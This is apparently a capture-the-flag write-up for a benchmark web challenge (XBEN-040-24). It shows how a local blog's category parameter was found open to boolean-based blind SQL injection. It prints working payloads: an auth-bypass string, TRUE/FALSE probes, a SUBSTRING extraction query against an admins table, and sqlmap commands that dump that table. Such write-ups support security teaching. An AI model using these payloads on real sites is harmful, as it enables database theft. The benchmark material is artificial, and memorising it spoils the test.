---
title: "XBEN-040-24 SQLi Exfiltration"
category: "Web"
taxonomy: "Injection"
vulnerability: "Boolean-based Blind SQL Injection"
difficulty: "Medium"
---

# Analysis

## Challenge Overview

The challenge presents a blog application with an admin login page and a category filtering functionality. At first glance, the login page appears to be the most probable attack target because SQL injection vulnerabilities are commonly found in authentication mechanisms.

Initial testing was performed using a standard authentication bypass payload:

```text
' OR '1'='1
```

The application responded with:

```text
Invalid username or password.
```

The authentication mechanism therefore did not appear vulnerable and attention shifted to other application inputs.

---

## Identifying the Attack Surface

Inspection of the application revealed a category filtering parameter:

```http
GET /?category=<value>
```

Supplying malformed user input:

```http
http://localhost:8080/?category='
```

generated an SQL syntax error:

```text
Error in query: You have an error in your SQL syntax...
```

This strongly suggested that user-controlled data was reaching an SQL query without sufficient sanitization.

---

## Testing SQL Injection Behavior

Boolean conditions were introduced into the parameter to determine whether application responses changed depending on query evaluation.

TRUE condition:

```http
http://localhost:8080/?category=%27%20OR%201=1%23
```

Response:

```text
Post not found
```

FALSE condition:

```http
http://localhost:8080/?category=%27%20OR%201=2%23
```

Response:

```text
Category does not exist
```

The application therefore exposed a Boolean response mechanism:

| SQL Condition | Application Response |
|---------------|----------------------|
| TRUE | Post not found |
| FALSE | Category does not exist |

Although no SQL output was directly visible, application behavior changed according to query evaluation.

---

## Vulnerability Identification

The application was identified as vulnerable to:

**Boolean-based Blind SQL Injection**

Observed characteristics:

- User-controlled input reaches SQL execution.
- SQL syntax errors can be triggered.
- Different responses reveal query truth values.
- Information can be inferred without direct output.

---

## Manual Extraction Possibility

The vulnerability can theoretically be exploited manually through character-by-character extraction.

Example payload:

```http
http://localhost:8080/?category=%27%20OR%20SUBSTRING((SELECT%20username%20FROM%20admins%20LIMIT%201),1,1)=%27a%27%23
```

Expected behavior:

```text
TRUE  -> Post not found
FALSE -> Category does not exist
```

This process could be repeated for each character position and for every database value.

However, the manual process becomes increasingly inefficient as the amount of extracted data grows.

---

## Automated Extraction Strategy

Instead of performing hundreds or thousands of manual requests, SQLMap can automate the exploitation process.

Database enumeration:

```bash
sqlmap -u "http://localhost:8080/?category=test" -p category --batch --dbs
```

Table enumeration:

```bash
sqlmap -u "http://localhost:8080/?category=test" -p category --batch -D blogDB --tables
```

Data extraction:

```bash
sqlmap -u "http://localhost:8080/?category=test" -p category --batch -D blogDB -T admins --dump
```

SQLMap automatically leverages the Boolean differences in application responses and reconstructs hidden values.

---

## Key Finding

The login page initially appears to be the vulnerable component, creating a misleading attack surface. The actual weakness exists in the category filtering functionality.

The challenge relies on indirect information disclosure rather than direct output, forcing an attacker to infer information from application behavior.
